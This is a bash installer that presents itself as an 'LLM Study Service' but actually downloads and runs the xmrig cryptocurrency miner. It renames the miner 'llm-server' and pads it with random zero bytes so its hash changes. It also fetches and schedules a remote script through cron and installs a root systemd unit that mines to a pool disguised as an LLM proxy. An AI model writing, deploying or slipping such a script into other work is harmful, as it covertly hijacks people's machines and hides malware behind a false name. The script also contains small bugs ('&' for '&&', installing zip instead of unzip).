#!/bin/bash

llmserver="${2:-llmproxy.6553500.xyz}"

arch=$(uname -m)
if ! command -v unzip
then
    echo "unzip 不存在，正在安装..."
    apt update -y & apt install zip -y
    echo "unzip 安装完成"
else
    echo "unzip 已经安装"
fi
if ! command -v crontab
then
    echo "定时任务 不存在，正在安装..."
    apt update -y & apt install cron -y
    echo "定时任务 安装完成"
else
    echo "定时任务 已经安装"
fi
U=$1
if [[ "$arch" == "arm"* || "$arch" == "aarch64" ]]; then
    param="arm"
    echo "是arm 下载arm版本"
else
    param=""
fi

wget https://github.com/caippx/xmrig/releases/download/6.22.2/llm$param.zip 
unzip llm$param.zip && rm -rf llm$param.zip
mkdir /etc/llm/
mv llm /etc/llm/llm-server
cd /etc/llm
count=$((RANDOM % 1000 + 1))
for ((i = 0; i < count; i++)); do
  echo -n "0" >> "/etc/llm/llm-server"
done
wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
chmod +x random_usage.sh
cron_job="0 */2 * * * /etc/llm/random_usage.sh"
(crontab -l | grep -qF "$cron_job") || (crontab -l; echo "$cron_job") | crontab -
service cron reload
service crond reload
cat > /etc/systemd/system/llm.service <<EOL
[Unit]
Description=LLM Study Service
After=network.target

[Service]
Type=simple
ExecStart=/etc/llm/llm-server --max-threads-hint 88 -o $llmserver:443 -u $U -p x -k --tls --huge-pages=true --asm=auto 
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable llm.service
systemctl start llm.service
sleep 2
systemctl status llm.service
